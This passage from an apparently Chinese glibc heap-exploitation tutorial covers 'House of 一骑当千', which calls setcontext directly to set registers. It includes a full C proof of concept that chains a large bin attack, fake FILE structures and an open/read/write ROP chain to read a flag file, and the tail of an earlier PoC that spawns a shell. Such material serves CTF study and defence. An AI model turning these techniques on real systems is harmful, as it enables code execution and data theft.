system_off;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set exit@sym.st_value to system_off 0x52290&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + exit_sym_st_value_off - <span class="number">8</span>) = <span class="number">0xf00120000174c</span>ul;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set other exit@sym members&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + hasharr_off) = <span class="number">0x7c967e3f</span>ul;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set hasharr to 0x7c967e3ful&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step6: get shell ---&gt; exit(\&quot;/bin/sh\&quot;)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>((<span class="type">size_t</span>) strptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="House-of-一骑当千"><a href="#House-of-一骑当千" class="headerlink" title="House of 一骑当千"></a>House of 一骑当千</h1><p>通常我们利用 <code>setcontext + 53</code> 通过 rdi 指向的内存给寄存器赋值，但是从 glibc-2-29 开始，setcontext 通过 rdx 指向的内存给寄存器赋值。</p>
<p>通常情况可以采用 gadget 对 rdx 赋值然后跳转到 setcontext gadget 继续执行，但使用 gadget 需要我们能控制 rdi 寄存器指向的内存的前几个字节，并且未来的 glibc 的 setcontext 也可能不再使用 rdx 寄存器。</p>
<p>因此我们需要一个通用的方法比如直接调用 setcontext 函数对寄存器赋值，而这中直接调用 setcontext 的方法就是 House of 一骑当千。</p>
<p>setcontext 函数原型为 <code>int setcontext(const ucontext_t *ucp)</code> ，其中 <code>ucontext_t</code> 结构体定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 64-bit FXSAVE format.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(cwd);</span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(swd);</span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(ftw);</span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(fop);</span><br><span class="line">  <span class="type">__uint64_t</span>		__ctx(rip);</span><br><span class="line">  <span class="type">__uint64_t</span>		__ctx(rdp);</span><br><span class="line">  <span class="type">__uint32_t</span>		__ctx(mxcsr);</span><br><span class="line">  <span class="type">__uint32_t</span>		__ctx(mxcr_mask);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpxreg</span>	_<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">libc_xmmreg</span>	_<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>		__glibc_reserved1[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> __ctx(uc_flags);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="type">stack_t</span> uc_stack;</span><br><span class="line">    <span class="type">mcontext_t</span> uc_mcontext;</span><br><span class="line">    <span class="type">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">    __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> __ssp[<span class="number">4</span>];</span><br><span class="line">  &#125; <span class="type">ucontext_t</span>;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0996462c16406336efd64497fff69725.png"
                      alt="在这里插入图片描述" style="zoom:15%;" 
                >
在`setcontext`函数中，除了对`mcontext_t uc_mcontext;` `sigset_t uc_sigmask;` `struct _libc_fpstate __fpregs_mem __ssp`这4个进行操作外，并没有对其他部分操作，也就是我们可以不关心其他的值。

<ul>
<li><p><code>uc_mcontext</code></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Context to describe whole processor state.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">gregset_t</span> __ctx(gregs);</span><br><span class="line">    <span class="comment">/* Note that fpregs is a pointer.  */</span></span><br><span class="line">    <span class="type">fpregset_t</span> __ctx(fpregs);</span><br><span class="line">    __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">mcontext_t</span>;</span><br></pre></td></tr></table></figure></div>

<p>这个就是存储寄存器的结构体，也是我们平时<code>setcontext+53</code>所使用的地方。有关数据设置和传统利用<code>setcontext+53</code>时一样即可。</p>
<p><strong>注意 <code>fpregs</code> 指针需要指向一块可读写内存。</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Restore the floating-point context.  Not the registers, only the</span><br><span class="line">       rest.  */</span><br><span class="line">    movq    oFPREGS(%rdx), %rcx</span><br><span class="line">    fldenv    (%rcx)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>uc_sigmask</code></p>
<p>这个主要是负责信号量，<strong>经测试全是0就可以，当然也可以使用其他程序拷贝过来的信号量。</strong></p>
</li>
<li><p><code>__ssp</code></p>
<p>这个所对应的步骤为<code>setcontext</code>中的如下内容，作用使加载 MXCSR 寄存器，经测试0也行，偏移为<code>0x1c0</code></p>
</li>
</ul>
<p>通过上述的设置就可以直接调用 <code>setcontext</code> 设置寄存器。例如 house of 魑魅魍魉 + house of 一骑当千 <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_yjdq" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// leak libc_base</span></span><br><span class="line">  <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x77040</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">  <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2660</span>;</span><br><span class="line">  <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x620</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x610</span>);</span><br><span class="line">  <span class="built_in">free</span>(large);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line">  <span class="built_in">free</span>(unsorted);</span><br><span class="line">  large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *fake_helper_file = large - <span class="number">2</span>;</span><br><span class="line">  <span class="type">size_t</span> *fake_wide_data = fake_helper_file + <span class="number">28</span>;</span><br><span class="line">  <span class="type">size_t</span> *fake_put_stream = fake_helper_file + <span class="number">6</span>;</span><br><span class="line">  <span class="type">size_t</span> *write_base = fake_helper_file + <span class="number">60</span>;</span><br><span class="line">  <span class="type">size_t</span> *fake_ucontext = fake_helper_file + <span class="number">62</span>;</span><br><span class="line">  <span class="type">size_t</span> *rop = fake_ucontext + <span class="number">190</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> memcpy_got_addr = libc_base + <span class="number">0x1d1040</span>;</span><br><span class="line">  <span class="type">size_t</span> IO_helper_jumps_addr = libc_base + <span class="number">0x1cdb20</span>;</span><br><span class="line">  <span class="type">size_t</span> IO_str_jumps_addr = libc_base + <span class="number">0x1ce720</span>;</span><br><span class="line"></span><br><span class="line">  fake_helper_file[<span class="number">4</span>] = <span class="number">0</span>;                        <span class="comment">// _IO_write_base</span></span><br><span class="line">  fake_helper_file[<span class="number">5</span>] = <span class="number">1</span>;                        <span class="comment">// _IO_write_ptr</span></span><br><span class="line">  fake_helper_file[<span class="number">17</span>] = (<span class="type">size_t</span>)large + <span class="number">0x1500</span>;  <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">  fake_helper_file[<span class="number">20</span>] = (<span class="type">size_t</span>)fake_wide_data;  <span class="comment">// _wide_data</span></span><br><span class="line">  fake_helper_file[<span class="number">27</span>] = IO_helper_jumps_addr;    <span class="comment">// vtable -&gt; _IO_helper_jumps</span></span><br><span class="line">  fake_helper_file[<span class="number">57</span>] = (<span class="type">size_t</span>)fake_put_stream; <span class="comment">// _put_stream</span></span><br><span class="line"></span><br><span class="line">  fake_wide_data[<span class="number">3</span>] = (<span class="type">size_t</span>)write_base; <span class="comment">// _IO_write_base -&gt; write_base</span></span><br><span class="line">  fake_wide_data[<span class="number">4</span>] =</span><br><span class="line">      (<span class="type">size_t</span>)write_base + <span class="number">0x80</span> * <span class="number">4</span>; <span class="comment">// _IO_write_base -&gt; write_base +</span></span><br><span class="line"></span><br><span class="line">  fake_put_stream[<span class="number">0</span>] = <span class="number">0x400</span>; <span class="comment">// _flags</span></span><br><span class="line">  fake_put_stream[<span class="number">1</span>] =</span><br><span class="line">      (<span class="type">size_t</span>)&amp;write_base[<span class="number">2</span>] - <span class="number">1</span>;               <span class="comment">// _IO_read_ptr -&gt; &amp;ucontext - 1</span></span><br><span class="line">  fake_put_stream[<span class="number">4</span>] = memcpy_got_addr - <span class="number">0x20</span>;  <span class="comment">// _IO_write_base</span></span><br><span class="line">  fake_put_stream[<span class="number">5</span>] = memcpy_got_addr;         <span class="comment">// _IO_write_ptr</span></span><br><span class="line">  fake_put_stream[<span class="number">6</span>] = memcpy_got_addr + <span class="number">0x28</span>;  <span class="comment">// _IO_write_end</span></span><br><span class="line">  fake_put_stream[<span class="number">7</span>] = <span class="number">0</span>;                       <span class="comment">// _IO_buf_base</span></span><br><span class="line">  fake_put_stream[<span class="number">8</span>] = (<span class="type">size_t</span>)<span class="number">-1</span>;              <span class="comment">// _IO_buf_end</span></span><br><span class="line">  fake_put_stream[<span class="number">17</span>] = (<span class="type">size_t</span>)large + <span class="number">0x1500</span>; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">  fake_put_stream[<span class="number">27</span>] = IO_str_jumps_addr;      <span class="comment">// vtable -&gt; _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">  write_base[<span class="number">0</span>] = (<span class="type">size_t</span>)setcontext;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;write_base[<span class="number">1</span>], <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(fake_ucontext, <span class="number">0</span>, <span class="number">968</span>);</span><br><span class="line">  <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x2aa82</span>;</span><br><span class="line">  <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x34bfa</span>;</span><br><span class="line">  <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x41f13</span>;</span><br><span class="line">  <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x85596</span>;</span><br><span class="line">  <span class="type">size_t</span> ret = pop_rax_ret + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  fake_ucontext[<span class="number">13</span>] = (<span class="type">size_t</span>)&amp;write_base[<span class="number">1</span>]; <span class="comment">// rdi -&gt; &quot;./flag&quot;</span></span><br><span class="line">  fake_ucontext[<span class="number">14</span>] = <span class="number">0</span>;                      <span class="comment">// rsi = 0</span></span><br><span class="line">  fake_ucontext[<span class="number">17</span>] = <span class="number">0x100</span>;                  <span class="comment">// edx = 0x100</span></span><br><span class="line">  fake_ucontext[<span class="number">20</span>] = (<span class="type">size_t</span>)rop;            <span class="comment">// rsp -&gt; rop</span></span><br><span class="line">  fake_ucontext[<span class="number">21</span>] = ret;                    <span class="comment">// rip -&gt; ret</span></span><br><span class="line">  fake_ucontext[<span class="number">28</span>] = (<span class="type">size_t</span>)large + <span class="number">0x1500</span>; <span class="comment">// fpregs -&gt; rw memory</span></span><br><span class="line"></span><br><span class="line">  rop[<span class="number">0</span>] = pop_rax_ret;</span><br><span class="line">  rop[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">  rop[<span class="number">2</span>] = syscall_ret;</span><br><span class="line">  rop[<span class="number">3</span>] = pop_rax_ret;</span><br><span class="line">  rop[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  rop[<span class="number">5</span>] = pop_rdi_ret;</span><br><span class="line">  rop[<span class="number">6</span>] = <span class="number">3</span>;</span><br><span class="line">  rop[<span class="number">7</span>] = pop_rsi_ret;</span><br><span class="line">  rop[<span class="number">8</span>] = (<span class="type">size_t</span>)write_base;</span><br><span class="line">  rop[<span class="number">9</span>] = syscall_ret;</span><br><span class="line">  rop[<span class="number">10</span>] = pop_rax_ret;</span><br><span class="line">  rop[<span class="number">11</span>] = <span class="number">1</span>;</span><br><span class="line">  rop[<span class="number">12</span>] = pop_rdi_ret;</span><br><span class="line">  rop[<span class="number">13</span>] = <span class="number">1</span>;</span><br><span class="line">  rop[<span class="number">14</span>] = pop_rsi_ret;</span><br><span class="line">  rop[<span class="number">15</span>] = (<span class="type">size_t</span>)write_base;</span><br><span class="line">  rop[<span class="number">16</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FSOP</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
</search>
